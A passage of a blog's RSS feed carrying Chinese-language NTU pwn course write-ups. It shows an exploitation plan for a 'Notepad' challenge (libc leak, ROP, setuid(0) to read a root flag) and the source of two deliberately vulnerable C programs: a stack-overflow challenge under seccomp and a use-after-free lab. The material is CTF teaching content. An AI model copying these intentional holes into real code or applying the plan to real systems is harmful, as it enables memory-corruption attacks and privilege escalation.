執行的時候如果遇到local端可以run但server爛掉的情況，有可能是raw_input()造成的，可以先註解掉這些東西，如果還是遇到一樣的問題，可以開docker在裡面執行&lt;/p></description></item><item><title>Simple PWN 0x36(2023 HW - Notepad-Stage 3)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x362023-hw---notepad-stage-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x362023-hw---notepad-stage-3/</guid><description>&lt;h1 id="simple-pwn-0x362023-hw---notepad-stage-3">
 Simple PWN 0x36(2023 HW - Notepad-Stage 3)
 &lt;a class="anchor" href="#simple-pwn-0x362023-hw---notepad-stage-3">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>呈上上題&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題沒時間解出來，所以僅僅做個紀錄，包含和各位大老討論的結果以及流程&lt;/p>
&lt;ol>
&lt;li>首先，後端有一個洞，就是在login的write，他的buf仔細和其他有call到write做對比會發現，他並沒有清掉buf的內容，這代表他會完完整整的把裡面的內容送到前端，但為甚麼前面兩題都沒有這個問題呢?因為前端並沒有把buf的內容印出來，所以首要目標是找到一個方法可以leak出內容的shellcode之類的，這樣我們就可以抓到text / libc base address&lt;/li>
&lt;li>知道這些事情可以幹嘛呢?check token有一個bof的洞，我們可以利用這個洞來傳送rop，所以需要ret2libc抓到base address之後在蓋rop&lt;/li>
&lt;li>ROP具體的內容是甚麼呢?有兩種方法可以拿到flag，一個是拿到shell之後setuid(0)，因為backend 有 suid 權限，所以我們才可以用 setuid(0) 以root 執行，然後cat /flag_root；第二種是直接ORW，看flag是啥這樣&lt;/li>
&lt;/ol></description></item><item><title>Simple PWN 0x37(2023 HW - HACHAMA)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x372023-hw---hachama/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x372023-hw---hachama/</guid><description>&lt;h1 id="simple-pwn-0x372023-hw---hachama">
 Simple PWN 0x37(2023 HW - HACHAMA)
 &lt;a class="anchor" href="#simple-pwn-0x372023-hw---hachama">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>stack pivot
rop
bof&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;#34;SECCOMP.h&amp;#34;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> n;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">char&lt;/span> msg[&lt;span style="color:#ae81ff">0x20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> n2;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">sock_filter&lt;/span> seccompfilter[]&lt;span style="color:#f92672">=&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	BPF_STMT(BPF_LD &lt;span style="color:#f92672">|&lt;/span> BPF_W &lt;span style="color:#f92672">|&lt;/span> BPF_ABS, ArchField),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	BPF_JUMP(BPF_JMP &lt;span style="color:#f92672">|&lt;/span> BPF_JEQ &lt;span style="color:#f92672">|&lt;/span> BPF_K, AUDIT_ARCH_X86_64, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	BPF_STMT(BPF_RET &lt;span style="color:#f92672">|&lt;/span> BPF_K, SECCOMP_RET_KILL),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	BPF_STMT(BPF_LD &lt;span style="color:#f92672">|&lt;/span> BPF_W &lt;span style="color:#f92672">|&lt;/span> BPF_ABS, SyscallNum),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(open),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(openat),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(read),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(write),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(close),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(readlink),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(getdents),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(getrandom),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(brk),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(rt_sigreturn),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(exit),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	Allow(exit_group),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	BPF_STMT(BPF_RET &lt;span style="color:#f92672">|&lt;/span> BPF_K, SECCOMP_RET_KILL),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">sock_fprog&lt;/span> filterprog&lt;span style="color:#f92672">=&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	.len&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">sizeof&lt;/span>(seccompfilter)&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">sock_filter&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	.filter&lt;span style="color:#f92672">=&lt;/span>seccompfilter
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">apply_seccomp&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span>(prctl(PR_SET_NO_NEW_PRIVS,&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span>)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		perror(&lt;span style="color:#e6db74">&amp;#34;Seccomp Error&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		exit(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span>(prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&lt;span style="color:#f92672">&amp;amp;&lt;/span>filterprog)&lt;span style="color:#f92672">==-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		perror(&lt;span style="color:#e6db74">&amp;#34;Seccomp Error&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		exit(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdin, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdout, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	apply_seccomp();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf2[&lt;span style="color:#ae81ff">0x30&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#75715e">// long n2 = 0x30;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	&lt;span style="color:#75715e">// char msg[0x20];
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	&lt;span style="color:#66d9ef">char&lt;/span> name[&lt;span style="color:#ae81ff">0x20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#75715e">// long n = 20;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	n2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x30&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	n &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">20&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Haaton&amp;#39;s name? &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	n &lt;span style="color:#f92672">=&lt;/span> read(&lt;span style="color:#ae81ff">0&lt;/span>, name, n);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	name[n] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	strcpy(msg, name);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	strcat(msg, &lt;span style="color:#e6db74">&amp;#34; hachamachama&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(msg);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;ECHO HACHAMA!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">while&lt;/span> (&lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		read(&lt;span style="color:#ae81ff">0&lt;/span>, buf2, n2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span> (strcmp(buf2, &lt;span style="color:#e6db74">&amp;#34;HACHAMA&amp;#34;&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			write(&lt;span style="color:#ae81ff">1&lt;/span>, buf2, n2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x38(Lab - UAF)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x38lab---uaf/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x38lab---uaf/</guid><description>&lt;h1 id="simple-pwn-0x38lab---uaf">
 Simple PWN 0x38(Lab - UAF)
 &lt;a class="anchor" href="#simple-pwn-0x38lab---uaf">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://hackmd.io/_uploads/ByxvsvNr6.png" alt="圖片" />&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">default_handle&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>event)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;EVENT: get event named &lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">!&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, event);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">entity&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>name;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>event;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">void&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>event_handle)(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">entity&lt;/span> &lt;span style="color:#f92672">*&lt;/span>entities[&lt;span style="color:#ae81ff">0x10&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">read_int&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">0x20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, buf, &lt;span style="color:#ae81ff">0x1f&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> atoi(buf);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">get_idx&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (idx &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0x10&lt;/span> &lt;span style="color:#f92672">||&lt;/span> idx &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		exit(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">memu&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;1. register entity&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;2. delete entity&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;3. set name&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;4. trigger event&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;choice: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">register_entity&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	entities[idx] &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">entity&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event_handle &lt;span style="color:#f92672">=&lt;/span> default_handle;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Default Event&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">delete_entity&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (entities[idx])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		free(entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		free(entities[idx]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		puts(&lt;span style="color:#e6db74">&amp;#34;Invalid index&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">set_name&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> len;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (entities[idx])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		printf(&lt;span style="color:#e6db74">&amp;#34;Nmae Length: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		len &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span> (len &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			exit(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name &lt;span style="color:#f92672">=&lt;/span> malloc(len);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		printf(&lt;span style="color:#e6db74">&amp;#34;Name: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		read(&lt;span style="color:#ae81ff">0&lt;/span>, entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name, len &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		puts(&lt;span style="color:#e6db74">&amp;#34;Invalid index&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">trigger_event&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (entities[idx])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		printf(&lt;span style="color:#e6db74">&amp;#34;Name: %s&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event_handle(entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
